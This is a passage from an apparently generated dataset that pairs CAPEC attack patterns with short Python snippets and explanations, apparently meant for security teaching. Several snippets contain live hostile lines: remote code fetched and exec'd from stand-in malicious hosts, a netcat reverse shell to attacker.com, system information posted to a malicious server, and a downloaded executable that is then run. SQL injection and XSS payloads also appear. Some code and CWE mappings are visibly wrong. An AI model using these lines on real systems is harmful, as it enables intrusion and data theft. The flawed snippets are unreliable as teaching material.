        "code_snippet": "class HardwareComponent:\n    def __init__(self, name, version, trusted=True):\n        self.name = name\n        self.version = version\n        self.trusted = trusted\n\n    def update_firmware(self):\n        if not self.trusted:\n            raise Exception('Cannot update untrusted hardware component')\n        print(f'Updating firmware for {self.name} to version {self.version + 1}')\n        self.version += 1\n\nclass System:\n    def __init__(self):\n        self.components = []\n\n    def add_component(self, component):\n        if not component.trusted:\n            print(f'Warning: Adding untrusted component {component.name}')\n        self.components.append(component)\n\n    def check_components(self):\n        for component in self.components:\n            if not component.trusted:\n                print(f'Error: Untrusted component {component.name} detected')\n            else:\n                print(f'Component {component.name} is trusted')\n\n# Example usage\nsystem = System()\ntrusted_component = HardwareComponent('TrustedComponent', 1)\nuntrusted_component = HardwareComponent('UntrustedComponent', 1, trusted=False)\nsystem.add_component(trusted_component)\nsystem.add_component(untrusted_component)\nsystem.check_components()\n\ntry:\n    untrusted_component.update_firmware()\nexcept Exception as e:\n    print(e)",
        "description": "This Python code snippet represents a simplified model of a system that manages hardware components, highlighting the risks associated with using untrusted or malicious hardware. The `HardwareComponent` class includes a method to update firmware, which raises an exception if the component is untrusted, reflecting CWE-1329 (Reliance on Component That is Not Updateable). The `System` class manages these components, warning when an untrusted component is added and checking the trust status of all components, embodying CWE-1357 (Reliance on Insufficiently Trustworthy Component) and CWE-1395 (Dependency on Vulnerable Third-Party Component). The example usage demonstrates adding both trusted and untrusted components to the system and attempting to update the firmware of an untrusted component, which fails, illustrating the potential risks of malicious hardware component replacement as described in the CAPEC."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a vulnerable third-party library to download and execute malicious code\nvulnerable_url = 'http://malicious.example.com/malware.py'\n\n# CWE-506: Embedded Malicious Code\n# Downloading and executing the malicious code\nresponse = requests.get(vulnerable_url)\nexec(response.text)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# The downloaded code could contain a virus or worm that replicates itself\n# CWE-1229: Creation of Emergent Resource\n# The malicious code could create new resources or files that violate security policies\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# The malicious code could inject errors to degrade system redundancy\n",
        "description": "This Python code snippet demonstrates the concept of 'Malicious Software Implanted' in a supply chain distribution channel. It uses a vulnerable third-party component (CWE-1395) to download and execute malicious code from a specified URL (CWE-506). The downloaded code could potentially contain a virus or worm that replicates itself (CWE-509), create new resources that violate security policies (CWE-1229), or inject errors to degrade system redundancy (CWE-1334). This snippet embodies the main idea of the CAPEC by showing how an attacker can implant malicious software into a system, causing disruption or enabling further compromise."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import sqlite3\nimport requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nresponse = requests.get('http://untrusted-source.com/malicious_library.py')\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '''\ndef backdoor():\n    import os\n    os.system('nc -e /bin/sh attacker.com 4444')\nbackdoor()\n'''\nexec(malicious_code)\n\n# CWE-89: SQL Injection\nuser_input = \"' OR '1'='1\"\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\ncursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")\n\n# CWE-707: Improper Neutralization\nmessage = \"<script>alert('XSS')</script>\"\nprint(f\"User message: {message}\")\n\n# CWE-1334: Unauthorized Error Injection\nclass RedundantSystem:\n    def __init__(self):\n        self.redundant_block = [1, 1, 1]\n    def inject_error(self):\n        self.redundant_block[0] = 0\n        print('Error injected, redundancy compromised')\n\nsystem = RedundantSystem()\nsystem.inject_error()",
        "description": "This Python code snippet demonstrates the concept of 'Rogue Integration Procedures' by incorporating several related CWEs. The code includes functionality from an untrusted source (CWE-829) by fetching and executing a script from an external URL. It embeds malicious code (CWE-506) that opens a backdoor connection. It also demonstrates an SQL injection vulnerability (CWE-89) by constructing an SQL query using unsanitized user input. Additionally, it shows improper neutralization (CWE-707) by directly printing a potentially harmful script. Finally, it simulates unauthorized error injection (CWE-1334) by altering a redundant system block, compromising its redundancy. This code represents how an attacker might insert malicious components into a system during the integration phase, leading to various security issues when the system is deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import xml.etree.ElementTree as ET\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    try:\n        xml_data = request.data\n        tree = ET.ElementTree(ET.fromstring(xml_data))\n        # Process the XML data (omitted for brevity)\n        return 'XML processed successfully', 200\n    except ET.ParseError:\n        return 'Invalid XML', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web service using Flask that processes XML data sent via POST requests. The code lacks proper validation and resource allocation limits, making it vulnerable to an XML Flood attack (CAPEC-230). Specifically, it does not validate the XML against a schema (CWE-112), does not impose any limits on the size or number of XML requests (CWE-770), and does not handle potential XML entity expansion issues (CWE-776). An attacker could exploit these weaknesses by sending a large number of XML requests, potentially causing a Denial of Service (DoS) by overwhelming the server's resources."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import os\nimport socket\nimport platform\nimport requests\n\n# Collect system information\nsystem_info = {\n    'os': platform.system(),\n    'os_version': platform.version(),\n    'hostname': socket.gethostname(),\n    'ip_address': socket.gethostbyname(socket.gethostname()),\n    'user': os.getlogin()\n}\n\n# Send collected information to an external server\nrequests.post('http://malicious-server.com/collect', json=system_info)\n",
        "description": "This Python code snippet demonstrates a basic form of malware-directed internal reconnaissance. It collects sensitive system information such as the operating system, OS version, hostname, IP address, and the current logged-in user. This information is then sent to an external server controlled by an attacker. The code embodies the main idea of the CAPEC by using malware to gather and exfiltrate information about the target system. The related CWEs are represented as follows:\n- CWE-497: The code exposes sensitive system information to an unauthorized control sphere by sending it to an external server.\n- CWE-506: The code contains malicious behavior by design, as it collects and exfiltrates sensitive information.\n- CWE-512: The code acts as spyware by collecting personally identifiable information without the user's consent.\n- CWE-509: Although not explicitly replicating, the code could be part of a larger malware that spreads to other systems."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import requests\n\nclass ThirdPartyComponent:\n    def __init__(self, url):\n        self.url = url\n        self.data = None\n\n    def fetch_data(self):\n        try:\n            response = requests.get(self.url)\n            response.raise_for_status()\n            self.data = response.json()\n        except requests.exceptions.RequestException as e:\n            print(f\"Error fetching data: {e}\")\n\n    def process_data(self):\n        if self.data:\n            # Simulate processing of data\n            print(\"Processing data...\")\n        else:\n            print(\"No data to process\")\n\n# Simulate the use of a counterfeit component\ncomponent = ThirdPartyComponent(\"http://malicious.example.com/data\")\ncomponent.fetch_data()\ncomponent.process_data()",
        "description": "This Python code snippet demonstrates the concept of 'Provide Counterfeit Component' by simulating the use of a third-party component that fetches data from a potentially malicious URL. The `ThirdPartyComponent` class has methods to fetch and process data. The `fetch_data` method retrieves data from a specified URL, which could be a counterfeit source. The `process_data` method simulates processing the fetched data. This example embodies the CAPEC by showing how an attacker could provide a counterfeit component (the URL) that is then integrated into a system, potentially leading to disruption or compromise. The code also touches on related CWEs, such as dependency on a vulnerable third-party component and reliance on an insufficiently trustworthy component."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import os\n\nclass HardwareComponent:\n    def __init__(self, name, version, updateable=True):\n        self.name = name\n        self.version = version\n        self.updateable = updateable\n\n    def update_firmware(self, new_version):\n        if not self.updateable:\n            raise Exception('Component is not updateable')\n        self.version = new_version\n        print(f'Firmware updated to version {new_version}')\n\n# Simulate a hardware component substitution\noriginal_component = HardwareComponent('TrustedComponent', '1.0')\nmalicious_component = HardwareComponent('MaliciousComponent', '1.0', updateable=False)\n\n# Substituting the trusted component with a malicious one\nsystem_component = malicious_component\n\ntry:\n    # Attempt to update the firmware of the malicious component\n    system_component.update_firmware('1.1')\nexcept Exception as e:\n    print(f'Error: {e}')\n\n# Simulate improper restriction of software interfaces to hardware features\nclass HardwareInterface:\n    def __init__(self, component):\n        self.component = component\n\n    def access_hardware_memory(self):\n        # Vulnerable code: no proper restriction\n        print(f'Accessing memory of {self.component.name}')\n\ninterface = HardwareInterface(system_component)\ninterface.access_hardware_memory()",
        "description": "This Python code snippet simulates a hardware component substitution attack, where a trusted hardware component is replaced with a malicious one. The `HardwareComponent` class represents a hardware component with attributes for name, version, and whether it is updateable. The `update_firmware` method attempts to update the firmware, but raises an exception if the component is not updateable, illustrating CWE-1329 (Reliance on Component That is Not Updateable). The code then substitutes the trusted component with a malicious one and attempts to update its firmware, resulting in an error. Additionally, the `HardwareInterface` class demonstrates improper restriction of software interfaces to hardware features (CWE-1256) by allowing unrestricted access to hardware memory. This snippet embodies the main idea of CAPEC-187 (Hardware Component Substitution) by showing how a malicious component can disrupt system functionality and compromise security."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import os\n\n# CWE-1277: Firmware Not Updateable\nclass Firmware:\n    def __init__(self, version):\n        self.version = version\n        self.updateable = False  # Firmware cannot be updated\n\n# CWE-1220: Insufficient Granularity of Access Control\nclass AccessControl:\n    def __init__(self):\n        self.access_level = 'broad'  # Access control is too broad\n\n    def check_access(self, user):\n        if self.access_level == 'broad':\n            return True  # Allows access to unauthorized agents\n        return False\n\n# CWE-506: Embedded Malicious Code\nclass BIOS:\n    def __init__(self, firmware):\n        self.firmware = firmware\n\n    def install(self):\n        if not self.firmware.updateable:\n            print('Installing BIOS version:', self.firmware.version)\n            # Malicious code embedded in BIOS installation\n            os.system('echo Malicious code executed')\n\n# CWE-1231: Improper Prevention of Lock Bit Modification\nclass LockBit:\n    def __init__(self):\n        self.locked = False\n\n    def set_lock(self):\n        self.locked = True\n\n    def modify_lock(self):\n        self.locked = not self.locked  # Lock bit can be modified after being set\n\n# CWE-1329: Reliance on Component That is Not Updateable\nclass SystemComponent:\n    def __init__(self):\n        self.component = Firmware('1.0')  # Component is not updateable\n\n# Main idea of CAPEC: Altered Installed BIOS\nfirmware = Firmware('1.0')\naccess_control = AccessControl()\nlock_bit = LockBit()\nsystem_component = SystemComponent()\nbios = BIOS(firmware)\n\n# Simulate an attacker altering the BIOS\nif access_control.check_access('attacker'):\n    lock_bit.set_lock()\n    lock_bit.modify_lock()  # Improper prevention of lock bit modification\n    bios.install()  # Install maliciously altered BIOS",
        "description": "This Python code snippet demonstrates the concept of 'Altered Installed BIOS' (CAPEC) by simulating a scenario where an attacker installs a maliciously altered BIOS. The code incorporates several related CWEs to provide context:\n\n1. CWE-1277: The Firmware class is not updateable, representing a system that cannot be patched to fix vulnerabilities.\n2. CWE-1220: The AccessControl class has insufficient granularity, allowing unauthorized access.\n3. CWE-506: The BIOS class contains embedded malicious code that gets executed during installation.\n4. CWE-1231: The LockBit class allows modification of the lock bit after it has been set, representing improper prevention of lock bit modification.\n5. CWE-1329: The SystemComponent class relies on a non-updateable component.\n\nThe main idea is to show how an attacker can exploit these weaknesses to install a malicious BIOS, which can then be used for future exploitation."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_update.exe'\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('update.exe', 'wb') as file:\n    file.write(response.content)\n\n# CWE-506: Embedded Malicious Code\n# Execute the downloaded file without verifying its integrity\nos.system('update.exe')\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker can introduce malicious code to a victim's system by altering the payload of a software update. The code downloads an executable file from a remote location without verifying its origin or integrity (CWE-494). It then saves the file locally and executes it, potentially running embedded malicious code (CWE-506). This represents the main idea of the CAPEC 'Malicious Manual Software Update', where an attacker can compromise a system by tricking the user into downloading and running a malicious update."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.updateable = False  # CWE-1277: Firmware Not Updateable\n\n    def replace_component(self, new_component):\n        if not self.verify_component(new_component):\n            raise ValueError(\"Malicious component detected!\")\n        self.firmware_version = new_component.firmware_version\n\n    def verify_component(self, component):\n        # CWE-506: Embedded Malicious Code\n        # Simulate a basic check for malicious code\n        if 'malicious' in component.firmware_version:\n            return False\n        return True\n\n# Simulate an adversary introducing a malicious hardware update\nmalicious_component = HardwareComponent('malicious_v1.0')\n\n# Original hardware component\noriginal_component = HardwareComponent('v1.0')\n\ntry:\n    original_component.replace_component(malicious_component)\nexcept ValueError as e:\n    print(e)  # Output: Malicious component detected!",
        "description": "This Python code snippet represents the concept of a 'Malicious Hardware Update' (CAPEC) by simulating the replacement of a hardware component with a malicious one. The `HardwareComponent` class has a firmware version and a flag indicating whether it is updateable (CWE-1277). The `replace_component` method attempts to replace the current component with a new one, but first verifies the new component to check for malicious code (CWE-506). If the new component is detected as malicious, an exception is raised. This demonstrates how an adversary could introduce a malicious hardware update, leveraging the inability to update firmware and the presence of embedded malicious code."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class MaliciousHardwareComponent:\n    def __init__(self):\n        self.firmware_version = '1.0.0'\n        self.malicious_code = self._embed_malicious_code()\n\n    def _embed_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        return 'malicious_payload'\n\n    def update_firmware(self, new_version):\n        # CWE-1329: Reliance on Component That is Not Updateable\n        print('Firmware update not supported.')\n\n    def use_vulnerable_component(self):\n        # CWE-1395: Dependency on Vulnerable Third-Party Component\n        vulnerable_component = 'vulnerable_library_v1.0'\n        print(f'Using {vulnerable_component}')\n\n    def access_confidential_info(self):\n        # CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        confidential_info = 'user_credentials'\n        print(f'Accessing confidential information: {confidential_info}')\n\n# Simulate the use of malicious hardware component\nmalicious_hardware = MaliciousHardwareComponent()\nmalicious_hardware.update_firmware('1.0.1')\nmalicious_hardware.use_vulnerable_component()\nmalicious_hardware.access_confidential_info()",
        "description": "This Python code snippet represents a malicious hardware component that embodies the main idea of the CAPEC 'Malicious Gray Market Hardware'. The class 'MaliciousHardwareComponent' includes several methods that demonstrate vulnerabilities related to the CWEs mentioned. The '_embed_malicious_code' method simulates embedding malicious code (CWE-506). The 'update_firmware' method shows reliance on a component that cannot be updated (CWE-1329). The 'use_vulnerable_component' method demonstrates dependency on a vulnerable third-party component (CWE-1395). Finally, the 'access_confidential_info' method simulates accessing unprotected confidential information (CWE-1297). This code snippet highlights how an attacker could maliciously alter hardware components to compromise systems."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive configuration data')\n    temp_file_path = temp_file.name\n\n# CWE-284: Improper Access Control\nos.chmod(temp_file_path, 0o777)  # Insecure permissions\n\n# CWE-99: Improper Control of Resource Identifiers\nconfig_file_path = '/etc/config/' + os.path.basename(temp_file_path)\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\nwith open(config_file_path, 'w') as config_file:\n    with open(temp_file_path, 'r') as temp_file:\n        config_file.write(temp_file.read())\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Simulated by writing to a debug file\nwith open('/sys/kernel/debug/debug_file', 'w') as debug_file:\n    debug_file.write('Activate debug mode')\n\nprint('Configuration complete.')",
        "description": "This Python code snippet demonstrates a scenario where an attacker can inject malicious data during the configuration process, leading to suboptimal system performance. The code creates an insecure temporary file (CWE-377) with sensitive configuration data and sets improper access permissions (CWE-284). It then improperly constructs a resource identifier (CWE-99) to move the temporary file to a critical configuration directory. Sensitive information is transferred without proper handling (CWE-201). Finally, it simulates the activation of debug logic at runtime (CWE-1313), which could alter the system's behavior. This code embodies the main idea of the CAPEC by showing how an attacker can manipulate configuration data to compromise a system."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n\n# Malicious function to alter hardware component\ndef malicious_alteration(component):\n    # Simulate malicious alteration\n    component['status'] = 'compromised'\n    return component\n\n# Function to simulate infiltration of hardware development environment\ndef infiltrate_hardware_env(dev_env):\n    for component in dev_env['components']:\n        if 'confidential_info' in component:\n            # CWE-1297: Accessing unprotected confidential information\n            confidential_info = component['confidential_info']\n            print(f\"Accessing confidential info: {confidential_info}\")\n        # CWE-506: Embedding malicious code\n        component = malicious_alteration(component)\n        print(f\"Component {component['id']} status: {component['status']}\")\n\n# Simulated hardware development environment\nhardware_dev_env = {\n    'components': [\n        {'id': 1, 'confidential_info': 'secret_key_1', 'status': 'clean'},\n        {'id': 2, 'confidential_info': 'secret_key_2', 'status': 'clean'},\n        {'id': 3, 'status': 'clean'}\n    ]\n}\n\n# Infiltrate the hardware development environment\ninfiltrate_hardware_env(hardware_dev_env)",
        "description": "This Python code snippet simulates the infiltration of a hardware development environment by an adversary. The `infiltrate_hardware_env` function iterates over hardware components in the development environment, accessing unprotected confidential information (CWE-1297) and embedding malicious code to alter the components (CWE-506). The `malicious_alteration` function simulates the compromise of a hardware component by changing its status to 'compromised'. This represents the CAPEC scenario where an adversary manipulates the development environment to insert malicious software, aiming to disrupt or further compromise the hardware components."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_library.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef malicious_function():\n    # Malicious code that could replicate or perform harmful actions\n    print('Malicious code executed')\n    # Example of replicating malicious code\n    with open('malicious_copy.py', 'w') as f:\n        f.write(response.text)\n\nmalicious_function()",
        "description": "This Python code snippet demonstrates the concept of 'Open-Source Library Manipulation' by downloading and executing code from an untrusted source without verifying its integrity (CWE-494). The downloaded code is then executed directly (CWE-829), which could include malicious functionality (CWE-506) and potentially replicate itself (CWE-509). The code also highlights the risk of depending on a third-party component that may contain vulnerabilities (CWE-1395). This example encapsulates the main idea of the CAPEC by showing how an adversary could implant and distribute malicious code through open-source libraries."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASIC:\n    def __init__(self):\n        self.security_token = 'secure_token'\n        self.sensitive_info = 'Sensitive System Information'\n\n    def execute(self, command):\n        if command == 'malicious_command':\n            self._malicious_functionality()\n        else:\n            print('Executing:', command)\n\n    def _malicious_functionality(self):\n        # CWE-506: Embedded Malicious Code\n        print('Malicious functionality executed!')\n        # CWE-497: Exposure of Sensitive System Information\n        print('Sensitive Info:', self.sensitive_info)\n\n    def get_security_token(self):\n        # CWE-1259: Improper Restriction of Security Token Assignment\n        return self.security_token\n\n# Simulating an attacker with access to the development environment\nasic = ASIC()\nasic.execute('malicious_command')\nprint('Security Token:', asic.get_security_token())",
        "description": "This Python code snippet simulates an ASIC (Application-Specific Integrated Circuit) with embedded malicious functionality. The `ASIC` class contains sensitive information and a security token. The `execute` method checks for a specific 'malicious_command' and triggers the `_malicious_functionality` method, which represents CWE-506 (Embedded Malicious Code) by executing harmful actions and CWE-497 (Exposure of Sensitive System Information) by printing sensitive information. The `get_security_token` method demonstrates CWE-1259 (Improper Restriction of Security Token Assignment) by returning the security token without proper protection. This code embodies the main idea of CAPEC-ASIC With Malicious Functionality, where an attacker with access to the development environment can insert malicious functionality into the system."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "def read_buffer(data, index):\n    buffer = [1, 2, 3, 4, 5]\n    try:\n        return buffer[index]\n    except IndexError:\n        return 'Index out of bounds!'\n\n# Example usage\nuser_input = int(input('Enter an index: '))\nprint(read_buffer(buffer, user_input))",
        "description": "This Python code snippet demonstrates a simple example of an overread buffer vulnerability. The function `read_buffer` takes a list `data` and an `index` as input. It attempts to read from a predefined buffer using the provided index. If the index is out of the buffer's bounds, an `IndexError` is caught, and a message 'Index out of bounds!' is returned. This code represents the main idea of CAPEC-129: Overread Buffers, where an adversary can provide an index that causes the application to read beyond the buffer's boundary, potentially leading to exposure of sensitive information or a system crash. The related CWEs are illustrated by the potential for out-of-bounds read (CWE-125), buffer over-read (CWE-126), and improper restriction of operations within the bounds of a memory buffer (CWE-119)."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import time\nimport random\n\n# Simulate different application versions\napp_versions = ['1.0', '1.1', '2.0']\n\n# Function to simulate application response based on version\ndef get_app_response(version):\n    if version == '1.0':\n        time.sleep(0.1)  # Simulate processing time\n        return 'Response from version 1.0'\n    elif version == '1.1':\n        time.sleep(0.2)  # Simulate processing time\n        return 'Response from version 1.1'\n    elif version == '2.0':\n        time.sleep(0.3)  # Simulate processing time\n        return 'Response from version 2.0'\n    else:\n        return 'Unknown version'\n\n# Simulate an adversary fingerprinting the application\nfor _ in range(5):\n    version = random.choice(app_versions)\n    start_time = time.time()\n    response = get_app_response(version)\n    end_time = time.time()\n    elapsed_time = end_time - start_time\n    print(f'Version: {version}, Response: {response}, Time taken: {elapsed_time:.2f} seconds')",
        "description": "This Python code snippet simulates an application with different versions, each responding with different processing times. The `get_app_response` function returns a response based on the version of the application and introduces a delay to simulate processing time. An adversary can fingerprint the application by observing the response times, which vary based on the version. This demonstrates the concept of 'Application Fingerprinting' (CAPEC) and highlights the CWE-208 'Observable Timing Discrepancy' vulnerability, where the time taken to complete operations reveals information about the application's internal state."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import os\nimport requests\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\n\nclass TargetedMalware:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def gather_system_info(self):\n        # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        system_info = {\n            'os': os.name,\n            'user': os.getlogin(),\n            'cwd': os.getcwd()\n        }\n        return system_info\n\n    def send_data(self, data):\n        # CWE-509: Replicating Malicious Code (Virus or Worm)\n        requests.post(self.target_url, json=data)\n\n    def execute(self):\n        system_info = self.gather_system_info()\n        self.send_data(system_info)\n        # Additional malicious actions can be added here\n\n# Example usage\nif __name__ == '__main__':\n    malware = TargetedMalware('http://malicious-server.com/collect')\n    malware.execute()",
        "description": "This Python code snippet represents a targeted malware attack. The `TargetedMalware` class is designed to gather sensitive system information (CWE-497) such as the operating system, current user, and current working directory. This information is then sent to a specified target URL, simulating the behavior of spyware (CWE-512). The code also embodies the concept of a Trojan Horse (CWE-507) by appearing to perform benign actions while hiding its true malicious intent. The `send_data` method could be extended to replicate malicious code (CWE-509) by sending the gathered information to other systems. This snippet demonstrates how targeted malware can exploit known vulnerabilities in an organizational IT environment to achieve various negative impacts, as described in the CAPEC."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "import requests\nfrom flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    return redirect(target_url)\n\n# CWE-494: Download of Code Without Integrity Check\n@app.route('/download')\ndef download_code():\n    code_url = request.args.get('code_url')\n    response = requests.get(code_url)\n    exec(response.text)\n    return 'Code executed'\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\n@app.route('/transfer', methods=['POST'])\ndef transfer_funds():\n    amount = request.form['amount']\n    # Simulate a fund transfer\n    return f'Transferred {amount} dollars'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a counterfeit website that demonstrates several vulnerabilities. The '/redirect' route exemplifies CWE-601 by redirecting users to a URL specified in the query parameters, which can be exploited for phishing attacks. The '/download' route demonstrates CWE-494 by downloading and executing code from a URL without verifying its integrity, potentially allowing the execution of malicious code. The '/transfer' route simulates a fund transfer without CSRF protection (CWE-352), making it vulnerable to unauthorized actions. This code represents the main idea of the CAPEC by creating a counterfeit website that can gather information or upload malware through these vulnerabilities."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import ssl\nimport socket\n\n# CWE-295: Improper Certificate Validation\ncontext = ssl.create_default_context()\ncontext.check_hostname = False  # Disabling hostname check\ncontext.verify_mode = ssl.CERT_NONE  # Disabling certificate verification\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\nserver_address = ('malicious-supplier.com', 443)  # Incorrect destination\n\n# CWE-656: Reliance on Security Through Obscurity\nsecret_key = 'supersecretkey'  # Security through obscurity\n\n# CWE-1229: Creation of Emergent Resource\n# Creating a resource that can be exploited\nemergent_resource = []\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n# Different behavior that can be observed\ndef send_data(data):\n    with socket.create_connection(server_address) as sock:\n        with context.wrap_socket(sock, server_hostname=server_address[0]) as ssock:\n            ssock.sendall(data.encode('utf-8'))\n            response = ssock.recv(1024)\n            emergent_resource.append(response)\n            return response\n\n# Simulating sending data to a counterfeit organization\nresponse = send_data('Sensitive Information')\nprint(response)",
        "description": "This Python code snippet demonstrates a scenario where an adversary creates a counterfeit organization that injects malicious components into the supply chain. The code includes several vulnerabilities: \n1. CWE-295: Improper Certificate Validation - The SSL context is configured to disable hostname checking and certificate verification, making it easy for an attacker to perform a man-in-the-middle attack.\n2. CWE-941: Incorrectly Specified Destination in a Communication Channel - The server address is set to a malicious supplier, representing the counterfeit organization.\n3. CWE-656: Reliance on Security Through Obscurity - A secret key is used as a security measure, which is not a robust protection mechanism.\n4. CWE-1229: Creation of Emergent Resource - The code creates an emergent resource (a list) that stores responses, which could be exploited by an attacker.\n5. CWE-207: Observable Behavioral Discrepancy With Equivalent Products - The function `send_data` behaves differently by sending data to a malicious server, which can be observed and exploited by an attacker.\n\nThe code simulates sending sensitive information to a counterfeit organization, highlighting the risks associated with improper certificate validation and incorrect destination specification."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import os\nimport mmap\n\n# Simulate sensitive data in a file\nsensitive_file_path = 'sensitive_data.txt'\nwith open(sensitive_file_path, 'w') as f:\n    f.write('Sensitive Information: SecretKey123')\n\n# Function to read data from a file\ndef read_sensitive_data(file_path):\n    with open(file_path, 'r') as f:\n        data = f.read()\n    return data\n\n# Function to clear sensitive data from a file (improperly)\ndef clear_sensitive_data(file_path):\n    with open(file_path, 'r+') as f:\n        size = os.path.getsize(file_path)\n        mm = mmap.mmap(f.fileno(), size)\n        mm.write(b'\\x00' * size)\n        mm.close()\n\n# Read sensitive data\nsensitive_data = read_sensitive_data(sensitive_file_path)\nprint(f'Read sensitive data: {sensitive_data}')\n\n# Clear sensitive data (improperly)\nclear_sensitive_data(sensitive_file_path)\n\n# Attempt to read data again after clearing\ncleared_data = read_sensitive_data(sensitive_file_path)\nprint(f'Data after clearing: {cleared_data}')",
        "description": "This Python code snippet demonstrates a scenario where sensitive data is stored in a file and then improperly cleared. The `read_sensitive_data` function reads the data from the file, while the `clear_sensitive_data` function attempts to clear the data by writing zeros to the file. However, this method may not be sufficient to ensure that the data is completely unrecoverable, embodying the idea of CAPEC-118 (Pull Data from System Resources) and related CWEs such as CWE-1330 (Remanent Data Readable after Memory Erase) and CWE-1272 (Sensitive Information Uncleared Before Debug/Power State Transition). The code highlights the risk of sensitive information being accessible even after an attempt to clear it."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import os\nimport tempfile\n\nclass CloudStorage:\n    def __init__(self):\n        self.storage = tempfile.NamedTemporaryFile(delete=False)\n\n    def store_data(self, data):\n        self.storage.write(data.encode('utf-8'))\n        self.storage.flush()\n\n    def delete_data(self):\n        # Incomplete deletion: only closing the file, not securely wiping the data\n        self.storage.close()\n        os.remove(self.storage.name)\n\n# Simulating a multi-tenant environment\ncloud_storage = CloudStorage()\ncloud_storage.store_data('Sensitive Information')\ncloud_storage.delete_data()\n\n# New tenant accessing the same storage resource\nnew_tenant_storage = CloudStorage()\nwith open(new_tenant_storage.storage.name, 'r') as file:\n    try:\n        print(file.read())  # Potentially accessing leftover sensitive data\n    except Exception as e:\n        print('No data found or access error:', e)",
        "description": "This Python code snippet simulates a cloud storage system in a multi-tenant environment where data deletion is incomplete. The `CloudStorage` class provides methods to store and delete data. However, the `delete_data` method only closes and removes the file without securely wiping its contents, embodying CWE-1266 and CWE-212. This can lead to a scenario where a new tenant can potentially access leftover sensitive information from a previous tenant, representing the main idea of the CAPEC 'Incomplete Data Deletion in a Multi-Tenant Environment'. The code demonstrates how improper data deletion can lead to unauthorized access to sensitive information."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
